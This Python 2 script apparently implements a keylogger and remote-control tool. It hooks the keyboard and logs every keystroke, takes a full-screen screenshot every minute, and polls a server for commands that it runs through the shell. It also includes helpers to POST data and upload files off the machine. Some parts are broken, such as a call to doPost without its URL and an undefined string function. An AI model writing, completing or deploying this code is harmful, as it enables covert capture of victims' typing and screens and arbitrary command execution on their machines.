import random 
import threading
import pyHook
import gtk.gdk
import urllib2, urllib
import pycurl
import cStringIO
import json
import subprocess

def OnKeyboardEvent(event):
    
    if event.KeyID == 13:
        text = '[Return] \n'
    elif event.KeyID == 165:
        text = '[Alt]'
    elif event.KeyID == 8:
        text = '[Back]'
    elif event.KeyID == 162:
        text = '[Ctrl]'
    else:
        text = chr(event.Ascii)
    fob = open('log.txt', 'a')
    doPost();
    
    fob.write(text)
    fob.close()
    return True

def captureImage():
    threading.Timer(60.0, captureImage).start()
    w = gtk.gdk.get_default_root_window()
    sz = w.get_size()
    pb = gtk.gdk.Pixbuf(gtk.gdk.COLORSPACE_RGB,False,8,sz[0],sz[1])
    pb = pb.get_from_drawable(w,w.get_colormap(),0,0,0,0,sz[0],sz[1])
    if (pb != None):
        name = random.getrandbits(32)
        name = str(name)+".png"
        pb.save(name,"png")
    checkRemoteServer()
        
def checkRemoteServer():
    req_url = makeFullUrl()
    data = urllib2.urlopen(req_url).read()
    data_json = json.loads(data)
    if data_json['batch'] == "true":
        result = executeBatchScript(data_json['command'])
        print result
      


def getRandomString():
     seed = random.getrandbits(32)
     return string(seed) 
def executeBatchScript(command):
    try:
        result = subprocess.check_output(command, shell=True)
    except subprocess.CalledProcessError as error:
        print("Error: Command exited with code {0}".format(error.returncode))
    return result    
def doPost(post_url):
    
    mydata=[('one','1'),('two','2')]    #The first is the var name the second is the value
    mydata=urllib.urlencode(mydata)
    path=post_url    #the url you want to POST to
    req=urllib2.Request(path, mydata)
    req.add_header("Content-type", "application/x-www-form-urlencoded")
    page=urllib2.urlopen(req).read()
    print page 
def uploadFile(url,filename):
    response = cStringIO.StringIO()
    c = pycurl.Curl()
    c.setopt(c.POST, 1)
    c.setopt(c.URL, url)
    c.setopt(c.HTTPPOST, [("file", (c.FORM_FILE, filename))])
# c.setopt(pycurl.HTTPPOST, [('file', (pycurl.FORM_FILE, file_path, pycurl.FORM_FILENAME, filename))])
    c.setopt(c.VERBOSE, 1)
    c.setopt(c.WRITEFUNCTION, response.write)
    c.perform()
    c.close()
def makeFullUrl():
    host = "http://localhost/"
    return host+"php.php"    
                    
               
    
hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
captureImage()

if __name__ == '__main__':
  import pythoncom
  pythoncom.PumpMessages()